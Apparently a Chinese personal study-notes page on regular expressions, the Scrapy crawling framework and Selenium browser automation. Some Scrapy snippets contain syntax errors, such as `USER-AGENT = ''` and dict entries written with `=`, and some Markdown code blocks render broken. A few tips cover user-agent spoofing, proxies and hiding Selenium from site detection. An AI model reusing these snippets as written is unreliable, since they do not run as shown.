<td style="text-align:center">匹配 pattern 但不获取匹配结果，也就是说这是一个非获取匹配，不进行存储供以后使用。这在使用 “或” 字符 (|) 来组合一个模式的各个部分是很有用。例如， 'industr(?:y|ies) 就是一个比 ‘industry|industries’ 更简略的表达式。</td>
</tr>
<tr>
<td style="text-align:center">(?=pattern)</td>
<td style="text-align:center">正向肯定预查（look ahead positive assert），在任何匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如，“Windows(?=95|98|NT|2000)“能匹配&quot;Windows2000&quot;中的&quot;Windows”，但不能匹配&quot;Windows3.1&quot;中的&quot;Windows”。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始。</td>
</tr>
<tr>
<td style="text-align:center">(?!pattern)</td>
<td style="text-align:center">正向否定预查(negative assert)，在任何不匹配pattern的字符串开始处匹配查找字符串。这是一个非获取匹配，也就是说，该匹配不需要获取供以后使用。例如&quot;Windows(?!95|98|NT|2000)“能匹配&quot;Windows3.1&quot;中的&quot;Windows”，但不能匹配&quot;Windows2000&quot;中的&quot;Windows&quot;。预查不消耗字符，也就是说，在一个匹配发生后，在最后一次匹配之后立即开始下一次匹配的搜索，而不是从包含预查的字符之后开始。</td>
</tr>
<tr>
<td style="text-align:center">(?&lt;=pattern)</td>
<td style="text-align:center">反向(look behind)肯定预查，与正向肯定预查类似，只是方向相反。例如，&quot;`(?&lt;=95</td>
</tr>
<tr>
<td style="text-align:center">(?&lt;!pattern)</td>
<td style="text-align:center">反向否定预查，与正向否定预查类似，只是方向相反。例如&quot;`(?&lt;!95</td>
</tr>
<tr>
<td style="text-align:center">x|y</td>
<td style="text-align:center">匹配 x 或 y。例如，‘z|food’ 能匹配 “z” 或 “food”。‘(z|f)ood’ 则匹配 “zood” 或 “food”。</td>
</tr>
<tr>
<td style="text-align:center">[xyz]</td>
<td style="text-align:center">字符集合。匹配所包含的任意一个字符。例如， ‘[abc]’ 可以匹配 “plain” 中的 ‘a’。</td>
</tr>
<tr>
<td style="text-align:center">[^xyz]</td>
<td style="text-align:center">负值字符集合。匹配未包含的任意字符。例如，<code>[^abc]</code> 可以匹配 “plain” 中的’p’、‘l’、‘i’、‘n’。</td>
</tr>
<tr>
<td style="text-align:center">[a-z]</td>
<td style="text-align:center">字符范围。匹配指定范围内的任意字符。例如，<code>[a-z]</code>可以匹配 ‘a’ 到 ‘z’ 范围内的任意小写字母字符。</td>
</tr>
<tr>
<td style="text-align:center">[^a-z]</td>
<td style="text-align:center">负值字符范围。匹配任何不在指定范围内的任意字符。例如，<code>[^a-z]</code> 可以匹配任何不在 ‘a’ 到 ‘z’ 范围内的任意字符。</td>
</tr>
<tr>
<td style="text-align:center">\b</td>
<td style="text-align:center"><strong>匹配一个单词边界</strong>，也就是指单词和空格间的位置。例如， ‘er\b’ 可以匹配&quot;never&quot; 中的 ‘er’，但不能匹配 “verb” 中的 ‘er’。</td>
</tr>
<tr>
<td style="text-align:center">\B</td>
<td style="text-align:center"><strong>匹配非单词边界</strong>。‘er\B’ 能匹配 “verb” 中的 ‘er’，但不能匹配 “never” 中的 ‘er’。</td>
</tr>
<tr>
<td style="text-align:center">\cx</td>
<td style="text-align:center">匹配由 x 指明的控制字符。例如， \cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 ‘c’ 字符。</td>
</tr>
<tr>
<td style="text-align:center">\d</td>
<td style="text-align:center">匹配一个数字字符。等价于 [0-9]。</td>
</tr>
<tr>
<td style="text-align:center">\D</td>
<td style="text-align:center">匹配一个非数字字符。等价于 <code>[^0-9]</code>。</td>
</tr>
<tr>
<td style="text-align:center">\f</td>
<td style="text-align:center">匹配一个换页符。等价于 \x0c 和 \cL。</td>
</tr>
<tr>
<td style="text-align:center">\n</td>
<td style="text-align:center">匹配一个换行符。等价于 \x0a 和 \cJ。</td>
</tr>
<tr>
<td style="text-align:center">\r</td>
<td style="text-align:center">匹配一个回车符。等价于 \x0d 和 \cM。</td>
</tr>
<tr>
<td style="text-align:center">\s</td>
<td style="text-align:center">匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \f\n\r\t\v]。</td>
</tr>
<tr>
<td style="text-align:center">\S</td>
<td style="text-align:center">匹配任何非空白字符。等价于 <code>[^ \f\n\r\t\v]</code>。</td>
</tr>
<tr>
<td style="text-align:center">\t</td>
<td style="text-align:center">匹配一个制表符。等价于 \x09 和 \cI。</td>
</tr>
<tr>
<td style="text-align:center">\v</td>
<td style="text-align:center">匹配一个垂直制表符。等价于 \x0b 和 \cK。</td>
</tr>
<tr>
<td style="text-align:center">\w</td>
<td style="text-align:center">匹配字母、数字、下划线。等价于<code>[A-Za-z0-9_]</code>。</td>
</tr>
<tr>
<td style="text-align:center">\W</td>
<td style="text-align:center">匹配非字母、数字、下划线。等价于<code> [^A-Za-z0-9_]</code>。</td>
</tr>
<tr>
<td style="text-align:center">\xn</td>
<td style="text-align:center">匹配 n，其中 n 为十六进制转义值。十六进制转义值必须为确定的两个数字长。例如，‘\x41’ 匹配 “A”。‘\x041’ 则等价于 ‘\x04’ &amp; “1”。正则表达式中可以使用 ASCII 编码。</td>
</tr>
<tr>
<td style="text-align:center">\num</td>
<td style="text-align:center">匹配 num，其中 num 是一个正整数。对所获取的匹配的引用。例如，‘(.)\1’ 匹配两个连续的相同字符。</td>
</tr>
<tr>
<td style="text-align:center">\n</td>
<td style="text-align:center">标识一个八进制转义值或一个向后引用。如果 \n 之前至少 n 个获取的子表达式，则 n 为向后引用。否则，如果 n 为八进制数字 (0-7)，则 n 为一个八进制转义值。</td>
</tr>
<tr>
<td style="text-align:center">\nm</td>
<td style="text-align:center">标识一个八进制转义值或一个向后引用。如果 \nm 之前至少有 nm 个获得子表达式，则 nm 为向后引用。如果 \nm 之前至少有 n 个获取，则 n 为一个后跟文字 m 的向后引用。如果前面的条件都不满足，若 n 和 m 均为八进制数字 (0-7)，则 \nm 将匹配八进制转义值 nm。</td>
</tr>
<tr>
<td style="text-align:center">\nml</td>
<td style="text-align:center">如果 n 为八进制数字 (0-3)，且 m 和 l 均为八进制数字 (0-7)，则匹配八进制转义值 nml。</td>
</tr>
<tr>
<td style="text-align:center">\un</td>
<td style="text-align:center">匹配 n，其中 n 是一个用四个十六进制数字表示的 Unicode 字符。例如， \u00A9 匹配版权符号 (?)。</td>
</tr>
</tbody>
</table>
<h3 id="实例">实例<a class="header-anchor" href="#实例"> ¶ </a></h3>
<h3 id="贪婪-和-非贪婪">贪婪 和 非贪婪<a class="header-anchor" href="#贪婪-和-非贪婪"> ¶ </a></h3>
<p>贪婪模式：在 符合的条件下，会尽可能多的去匹配</p>
<p>非贪婪：匹配最少次数</p>
<p>默认为贪婪模式，启用非贪婪模式，在 表示重复的元字符后 加上一个<code>?</code></p>
<h3 id="实践遇到的问题">实践遇到的问题<a class="header-anchor" href="#实践遇到的问题"> ¶ </a></h3>
<ul>
<li>
<p>字符类中匹配<code>-</code>，例如一个字符类匹配<code>abc-</code> 4个字符</p>
<ul>
<li>需要将<code>-</code>写在最前面，如<code>[-abc]</code>，不写在最前面均表示范围</li>
</ul>
</li>
<li>
<p>如何匹配小括号<code>()</code></p>
<ul>
<li>
<p>若匹配的字面值含有<code>()</code>需要将其用中括号括起表示一个字符类</p>
<p>例如：想匹配<code>(</code>需要写成<code>[(]</code></p>
</li>
</ul>
</li>
</ul>
<h2 id="Scrapy-爬虫框架">Scrapy 爬虫框架<a class="header-anchor" href="#Scrapy-爬虫框架"> ¶ </a></h2>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">创建项目：scrapy startproject xxx</span><br><span class="line">进入项目：<span class="built_in">cd</span> xxx #进入某个文件夹下</span><br><span class="line">创建爬虫：scrapy genspider xxx（爬虫名） xxx.com （爬取域）</span><br><span class="line">生成文件：scrapy crawl xxx -o xxx.json (生成某种类型的文件)</span><br><span class="line">运行爬虫：scrapy crawl XXX</span><br><span class="line">列出所有爬虫：scrapy list</span><br><span class="line">获得配置信息：scrapy settings [options]</span><br></pre></td></tr></table></figure>
<h3 id="框架流程">框架流程<a class="header-anchor" href="#框架流程"> ¶ </a></h3>
<h4 id="【1】-创建一个scrpy框架项目">**【1】**创建一个scrpy框架项目<a class="header-anchor" href="#【1】-创建一个scrpy框架项目"> ¶ </a></h4>
<p>cmd命令行输入</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">scrapy startproject [dirname]</span><br></pre></td></tr></table></figure>
<p>会在当前目录生成一个[dirname]的文件夹</p>
<p>该文件夹目录结构为</p>
<ul>
<li>scrapy.cfg：项目的配置文件。</li>
<li>[dirname]/：项目的大本营。</li>
<li>[dirname]/items.py：定义项目中需要抓取并需要后期处理的数据。</li>
<li>[dirname]/middlewares.py：项目中的中间件（自定义扩展下载功能的组件）。</li>
<li>[dirname]/pipelines.py：用于存放执行后期数据处理的功能，从而使得数据的爬取的处理分开</li>
<li>[dirname]/settings.py：项目的设置文件，配置Scrapy。可以设置user-agent，爬取时间间隔，设置代理等等</li>
<li>[dirname]/spiders/：放置爬虫代码的目录。</li>
</ul>
<h5 id="settings-py"><a href="http://settings.py">settings.py</a><a class="header-anchor" href="#settings-py"> ¶ </a></h5>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># robots协议</span></span><br><span class="line">ROBOTSTXT_OBEY = <span class="literal">True</span> <span class="comment"># / False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示指定类型的日志信息</span></span><br><span class="line">LOG_LEVEL = <span class="string">&#x27;ERROR&#x27;</span>		<span class="comment"># 只显示错误信息，运行时不会太多无关信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># User-Agent 头部</span></span><br><span class="line">USER-AGENT = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启管道 pipelines.py</span></span><br><span class="line">ITEM_PIPELINES = &#123;</span><br><span class="line">    <span class="string">&#x27;类名&#x27;</span> = <span class="number">300</span>,	<span class="comment"># 数值表示优先级，越小越高</span></span><br><span class="line">    <span class="comment"># 可以在管道里写多个处理类</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定图片存储路径</span></span><br><span class="line">IMAGES_STORE = <span class="string">&#x27;./imgs&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启中间件</span></span><br><span class="line"><span class="comment"># 开启爬虫中间件</span></span><br><span class="line">SPIDER_MIDDLEWARES =&#123;</span><br><span class="line">    <span class="string">&#x27;类名&#x27;</span> = <span class="number">543</span>,	<span class="comment"># 同管道类</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 开启下载中间件</span></span><br><span class="line">DOWNLOADER_MIDDLEWARES =&#123;</span><br><span class="line">    <span class="string">&#x27;类名&#x27;</span> = <span class="number">543</span>,	<span class="comment"># 同管道类</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="pipelines-py"><a href="http://pipelines.py">pipelines.py</a><a class="header-anchor" href="#pipelines-py"> ¶ </a></h5>
<p>需要在setting内开启管道配置</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xxx</span>():</span></span><br><span class="line">    fp = <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 重写方法，该方法在开始爬虫前调用一次</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">open_spider</span>(<span class="params">self,spider</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;开始爬虫...&#x27;</span>)</span><br><span class="line">        self.fp = <span class="built_in">open</span>(<span class="string">&#x27;./resu.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 重写方法 专门用来处理item类型对象</span></span><br><span class="line">    <span class="comment"># 接收spiders提交过来的item对象</span></span><br><span class="line">    <span class="comment"># 每接收到一个item都会被调用一次</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">process_item</span>(<span class="params">self, item, spider</span>):</span></span><br><span class="line">        author = item[<span class="string">&#x27;author&#x27;</span>]</span><br><span class="line">        content = item[<span class="string">&#x27;content&#x27;</span>]</span><br><span class="line">        self.fp.write(author + <span class="string">&#x27;:&#x27;</span> + content + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> item		<span class="comment"># 如果有下一个管道处理类，会将item返回给下一个管道处理类</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 重写方法，结束爬虫后调用一次</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close_spider</span>(<span class="params">self, spider</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;爬虫结束...&#x27;</span>)</span><br><span class="line">        self.fp.close()</span><br></pre></td></tr></table></figure>
<h5 id="middlewares-py"><a href="http://middlewares.py">middlewares.py</a><a class="header-anchor" href="#middlewares-py"> ¶ </a></h5>
<p>中间件  <strong>使用前需要在settings.py中开启</strong></p>
<ul>
<li>
<p><code>MiddleproSpiderMiddleware(obgect)</code>爬虫中间件</p>
</li>
<li>
<p><code>MiddleproDownloaderMiddleware(obgect)</code>下载中间件</p>
<ul>
<li>
<p><code>from_crawler</code> 返回下载中间件实例化对象</p>
</li>
<li>
<p><code>process_request</code> 用来拦截处理请求</p>
<ul>
<li>
<p>可以写UA伪装</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">request.headers[<span class="string">&#x27;User-Agent&#x27;</span>] = <span class="string">&#x27;&#x27;</span>	<span class="comment"># 可以封装UA池</span></span><br><span class="line">request.meta[<span class="string">&#x27;proxy&#x27;</span>] = <span class="string">&#x27;&#x27;</span>	<span class="comment"># 使用代理</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>process_response</code> 用于拦截处理响应</p>
</li>
<li>
<p><code>process_exception</code> 用于拦截发生异常请求</p>
<ul>
<li>
<p>一般写代理ip（可以写到request函数）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 代理池</span></span><br></pre></td></tr></table></figure>
</li>
</ul>
</li>
<li>
<p><code>spider_opend</code> 打印日志</p>
</li>
</ul>
</li>
</ul>
<h4 id="【2】-定义Items-py">**【2】**<a href="http://xn--Items-xs1hm90f.py">定义Items.py</a><a class="header-anchor" href="#【2】-定义Items-py"> ¶ </a></h4>
<p>Items是将要装载抓取的数据的容器，它工作方式像python里面的字典，但它提供更多的保护，比如对未定义的字段填充以防止拼写错误。</p>
<p>它通过创建一个scrapy.item.Item类来声明，定义它的属性为scrpy.item.Field对象，就像是一个对象关系映射(ORM).<br>
我们通过将需要的item模型化，来控制从dmoz.org获得的站点数据，比如我们要获得站点的名字，url和网站描述，我们定义这三种属性的域。要做到这点，我们编辑在tutorial目录下的items.py文件，我们的Item类将会是这样</p>
<p>示例</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scrapy.item <span class="keyword">import</span> Item, Field </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DmozItem</span>(<span class="params">Item</span>):</span></span><br><span class="line">    title = Field()</span><br><span class="line">    link = Field()</span><br><span class="line">    desc = Field()</span><br></pre></td></tr></table></figure>
<h4 id="【3】-在-dirname-spiders-创建python文件">**【3】**在<code>[dirname]/spiders/</code>创建python文件<a class="header-anchor" href="#【3】-在-dirname-spiders-创建python文件"> ¶ </a></h4>
<p>根目录输入命令，会自动创建</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">scrapy genspider [name] [start_url]</span><br></pre></td></tr></table></figure>
<p>在里面编写爬虫类Spider，Spider是用户编写的用于从网站上爬取数据的类</p>
<ul>
<li>创建一个自定义的Spider时，必须继承scrapy.Spider类，且定义以下三个属性：
<ul>
<li>
<p>name：用于<strong>区别不同的Spider</strong>。<strong>该名字必须是唯一</strong>的，不可以为不同的Spider设定相同的名字。</p>
</li>
<li>
<p>start_requests：包含了Spider在启动时进行爬取的URL列表。该函数<strong>必须返回Requests对象</strong>或者其生成器。</p>
<ul>
<li>
<pre><code class="language-python"># Requests对象属性
print(type(response))  # scrapy.http.response.html.HtmlResponse
print(type(response.text))  # str
print(type(response.body))  # bytes
print(response.encoding)  # utf-8
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  </span><br><span class="line">  - parse()：这是Spider的一个默认回调函数。当下载器返回Response的时候，parse()函数就会被调用，每个初始URL完成下载后生成的Response对象将会作为唯一的参数传递给parse()函数。该方法负责解析返回的数据（response data），提取数据（生成item）以及生成需要进一步处理的URL的Request对象。</span><br><span class="line"></span><br><span class="line">#### **【4】**开始爬取</span><br><span class="line"></span><br><span class="line">在scrapy项目根目录执行命令`scrapy crawl [obj_name]`，其中`obj_name`是python文件自定义类里的name值</span><br><span class="line"></span><br><span class="line">也可以在项目根目录创建`main.py`文件</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">from scrapy.cmdline import execute</span><br><span class="line">execute(&quot;scrapy crawl [obj_name]&quot;.split())</span><br></pre></td></tr></table></figure>

</code></pre>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># 命令行执行</span><br><span class="line">scrapy crawl [obj_name]</span><br><span class="line">scrapy crawl [obj_name] -o ./[file_name].csv</span><br><span class="line">#或其他格式  json csv xml pickle</span><br></pre></td></tr></table></figure>
<h3 id="Scrapy-shell">Scrapy shell<a class="header-anchor" href="#Scrapy-shell"> ¶ </a></h3>
<p>根目录执行命令</p>
<ul>
<li>
<p>加载网页（参数url需要加双引号）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scrapy shell url</span><br></pre></td></tr></table></figure>
<p>加载网页成功后，response回应存储在本地变量response中</p>
<ul>
<li><code>response.body</code> ：获得网页html代码</li>
<li><code>response.headers</code> ：获得网页的header部分信息</li>
</ul>
</li>
</ul>
<h3 id="Selector选择器">Selector选择器<a class="header-anchor" href="#Selector选择器"> ¶ </a></h3>
<p>选择器包<code>scrapy.selector.Selector</code></p>
<ul>
<li>response.selector.xpath()：xPath选择器；也可省略写成<code>.xpath()：</code>会返回一系列selectors</li>
<li>response.selector.css()：CSS选择器；也可省略写成<code>.css()</code>：会返回一系列selectors</li>
<li>response.selector.extract()：返回一个unicode字符串，为选中的数据</li>
<li><a href="http://response.selector.re">response.selector.re</a>()：正则表达式选择器，返回字符串</li>
</ul>
<h3 id="请求传参">请求传参<a class="header-anchor" href="#请求传参"> ¶ </a></h3>
<p>爬取的内容不再同一页面，</p>
<p>用parse函数最后yield scrapy.http.Request来调用一个更深的页面（自己定义函数）</p>
<h3 id="图片爬取">图片爬取<a class="header-anchor" href="#图片爬取"> ¶ </a></h3>
<p>管道类需要继承<code>ImagesPipeLine</code>类</p>
<p>使用前需要先导入包</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scrapy.pipelines.images <span class="keyword">import</span> ImagesPipeline</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">imgsPipleLine</span>(<span class="params">ImagesPipeline</span>):</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 重写  根据图片地址进行图片数据请求，传入图片src地址</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_media_requests</span>(<span class="params">self, item, info</span>):</span></span><br><span class="line">        <span class="keyword">yield</span> scrapy.Request(item[<span class="string">&#x27;src&#x27;</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 方法重写 指定图片存储的路径</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">file_path</span>(<span class="params">self, request, response=<span class="literal">None</span>, info=<span class="literal">None</span></span>):</span></span><br><span class="line">        imgName = <span class="string">&#x27;&#x27;</span>	<span class="comment"># 指定每个图片名称</span></span><br><span class="line">        <span class="keyword">return</span> imgName</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">item_completed</span>(<span class="params">self, results, item, info</span>):</span></span><br><span class="line">        <span class="keyword">return</span> item		<span class="comment"># 赶回给下一个即将被执行的管道类</span></span><br></pre></td></tr></table></figure>
<p>需要在<code>settings.py</code>中指定图片存储路径</p>
<h2 id="selenium">selenium<a class="header-anchor" href="#selenium"> ¶ </a></h2>
<p>基于浏览器 自动化测试模块</p>
<p><a href="https://python-selenium-zh.readthedocs.io/zh_CN/latest/">selenium-python中文文档 (python-selenium-zh.readthedocs.io)</a></p>
<h3 id="安装-2">安装<a class="header-anchor" href="#安装-2"> ¶ </a></h3>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python -m pip install selenium</span><br></pre></td></tr></table></figure>
<h3 id="使用">使用<a class="header-anchor" href="#使用"> ¶ </a></h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="comment"># 4 自定义设置chrome路径，并用chromedriver控制</span></span><br><span class="line">options = webdriver.ChromeOptions()</span><br><span class="line"></span><br><span class="line"><span class="comment">######## 如果想隐藏浏览器窗口（无可视化界面），添加下面两行代码</span></span><br><span class="line">options.add_argument(<span class="string">&#x27;--headless&#x27;</span>)</span><br><span class="line">options.add_argument(<span class="string">&#x27;--disable-gpu&#x27;</span>)</span><br><span class="line"><span class="comment">########</span></span><br><span class="line"></span><br><span class="line"><span class="comment">######## 规避网站检测selenium</span></span><br><span class="line">options.add_experimental_option(<span class="string">&#x27;excludeSwitches&#x27;</span>,[<span class="string">&#x27;enable-automation&#x27;</span>])</span><br><span class="line"><span class="comment">########</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># chrome可执行文件的路径，需要修改chrome文件名</span></span><br><span class="line">options.binary_location = <span class="string">r&#x27;F:\palmer\MiniSoftware\RunningCheeseChrome\App\chrom.exe&#x27;</span></span><br><span class="line">bro = webdriver.Chrome(executable_path=<span class="string">&#x27;./chromedriver.exe&#x27;</span>, chrome_options=options)</span><br><span class="line">bro.get(<span class="string">&#x27;https://www.baidu.com&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>webdriver.Chrome类对象</p>
<table>
<thead>
<tr>
<th style="text-align:center">属性</th>
<th style="text-align:center">含义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>.page_source</code></td>
<td style="text-align:center">获取浏览器当前页面的html源码数据</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th style="text-align:center">方法</th>
<th style="text-align:center">含义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>.get(url)</code></td>
<td style="text-align:center">打开网址</td>
</tr>
<tr>
<td style="text-align:center"><code>.quit()</code></td>
<td style="text-align:center">关闭浏览器</td>
</tr>
<tr>
<td style="text-align:center"><code>.close()</code></td>
<td style="text-align:center">关闭当前标签</td>
</tr>
<tr>
<td style="text-align:center"><code>.find_element_by_xpath()</code></td>
<td style="text-align:center">使用xpath来寻找元素</td>
</tr>
<tr>
<td style="text-align:center"><code>.find_element_by_id/name()</code></td>
<td style="text-align:center">通过属性值id或者name值来寻找</td>
</tr>
<tr>
<td style="text-align:center"><code>.execute_script()</code></td>
<td style="text-align:center">执行js代码</td>
</tr>
<tr>
<td style="text-align:center"><code>.back()</code></td>
<td style="text-align:center">网页后退</td>
</tr>
<tr>
<td style="text-align:center"><code>.dorward()</code></td>
<td style="text-align:center">网页前进</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
<p>WebElement类对象</p>
<table>
<thead>
<tr>
<th style="text-align:center">属性/方法</th>
<th style="text-align:center">含义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>.get_attribute()</code></td>
<td style="text-align:center">得到标签属性的值</td>
</tr>
<tr>
<td style="text-align:center"><code>.send_keys()</code></td>
<td style="text-align:center">写入内容</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
<h3 id="定位元素">定位元素<a class="header-anchor" href="#定位元素"> ¶ </a></h3>
<ul>
<li>
<p>根据Id属性值定位：返回<strong>第一个</strong>name属性匹配的元素，如果没有元素匹配，会抛出<code>NoSuchElementException</code>异常。</p>
<ul>
<li>
<pre><code class="language-python">login_form = driver.find_element_by_id('loginForm')
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 根据Name属性值定位：同上</span><br><span class="line"></span><br><span class="line">  - ```python</span><br><span class="line">    continue = driver.find_element_by_name(&#x27;continue&#x27;)</span><br></pre></td></tr></table></figure>

</code></pre>
</li>
</ul>
</li>
<li>
<p>使用XPath定位：</p>
<ul>
<li>
<pre><code class="language-python">clear_button = driver.find_element_by_xpath(&quot;&quot;)
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 使用链接文本定位超链接：</span><br><span class="line"></span><br><span class="line">  - ```python</span><br><span class="line">    continue_link = driver.find_element_by_link_text(&#x27;Continue&#x27;)</span><br><span class="line">    continue_link = driver.find_element_by_partial_link_text(&#x27;Conti&#x27;)</span><br></pre></td></tr></table></figure>

</code></pre>
</li>
<li>
<p>参数即为 a标签内的文字</p>
</li>
</ul>
</li>
<li>
<p>标签名定位</p>
<ul>
<li>
<pre><code class="language-python">heading1 = driver.find_element_by_tag_name('h1')
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- class定位</span><br><span class="line"></span><br><span class="line">  - ```python</span><br><span class="line">    content = driver.find_element_by_class_name(&#x27;content&#x27;)</span><br></pre></td></tr></table></figure>

</code></pre>
</li>
<li>
<p>只返回匹配的第一个</p>
</li>
</ul>
</li>
<li>
<p>css选择器定位</p>
<ul>
<li>
<pre><code class="language-python">content = driver.find_element_by_css_selector('p.content')
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">### 等待事件</span><br><span class="line"></span><br><span class="line">#### 显式等待</span><br><span class="line"></span><br><span class="line">显式的`waits`等待一个确定的条件触发然后才进行更深一步的执行。最糟糕的的做法是`time.sleep()`，这指定的条件是等待一个指定的时间段。 这里提供一些便利的方法让你编写的代码只等待需要的时间，`WebDriverWait`结合`ExpectedCondition`是一种实现的方法：</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">from selenium import webdriver</span><br><span class="line">from selenium.webdriver.common.by import By</span><br><span class="line">from selenium.webdriver.support.ui import WebDriverWait</span><br><span class="line">from selenium.webdriver.support import expected_conditions as EC</span><br><span class="line"></span><br><span class="line">driver = webdriver.Firefox()</span><br><span class="line">driver.get(&quot;http://somedomain/url_that_delay_loading&quot;)</span><br><span class="line">try:</span><br><span class="line">    element = WebDriverWait(driver,10).until(</span><br><span class="line">        EC.presence_of_element_located((By.ID,&quot;myDynamicElement&quot;))</span><br><span class="line">    )</span><br><span class="line">finally:</span><br><span class="line">    driver.quit()</span><br></pre></td></tr></table></figure>

</code></pre>
</li>
</ul>
</li>
</ul>
<p>这段代码会等待10秒，如果10秒内找到元素则立即返回，否则会抛出<code>TimeoutException</code>异常，WebDriverWait默认每500毫秒调用一下<code>ExpectedCondition</code>直到它返回成功为止。<code>ExpectedCondition</code>类型是布尔的，成功的返回值就是true,其他类型的<code>ExpectedCondition</code>成功的返回值就是 <code>not null</code></p>
<h4 id="隐式等待">隐式等待<a class="header-anchor" href="#隐式等待"> ¶ </a></h4>
<p>当我们要找一个或者一些不能立即可用的元素的时候，隐式<code>waits</code>会告诉WebDriver轮询DOM指定的次数，默认设置是0次。一旦设定，WebDriver对象实例的整个生命周期的隐式调用也就设定好了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">driver = webdriver.Firefox()</span><br><span class="line">driver.implicitly_wait(<span class="number">10</span>)		<span class="comment"># 设置隐式等待 最大等待时间</span></span><br><span class="line">driver.get(<span class="string">&quot;http://somedomain/url_that_delays_loading&quot;</span>)</span><br><span class="line">myDynamicElement = driver.find_element_by_id(<span class="string">&#x27;myDynamicElement&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h3 id="行为链">行为链<a class="header-anchor" href="#行为链"> ¶ </a></h3>
<p>更多函数查阅<a href="https://selenium-python.readthedocs.io/api.html#module-selenium.webdriver.common.action_chains">7. WebDriver API — Selenium Python Bindings 2 documentation (selenium-python.readthedocs.io)</a></p>
